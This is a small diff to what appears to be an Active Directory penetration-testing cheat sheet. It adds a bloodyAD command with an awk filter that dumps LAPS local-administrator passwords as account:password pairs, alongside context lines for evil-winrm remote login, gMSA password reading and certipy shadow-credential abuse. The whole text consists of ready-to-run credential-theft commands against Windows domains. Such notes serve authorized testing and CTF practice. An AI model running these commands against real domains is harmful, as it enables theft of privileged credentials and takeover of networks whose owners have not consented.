@@ -666,6 +666,9 @@ evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 +---------- ReadGMSAPassword ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
 
++---------- ReadLAPSPassword ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr samaccountname,ms-mcs-admpwd | awk 'BEGIN{RS="";FS="\n"}{u="";p="";for(i=1;i<=NF;i++){if($i~/sAMAccountName:/){sub(/.*:[ \t]*/,"",$i);u=$i} if($i~/ms-Mcs-AdmPwd:/){sub(/.*:[ \t]*/,"",$i);p=$i}} if(u!=""&&p!="") print u ":" p}'
+
 +---------- AddKeyCredentialLink ----------+
 certipy shadow auto -dc-ip $TARGET -target $DC -k -account 'SVC_CABACKUP'
 
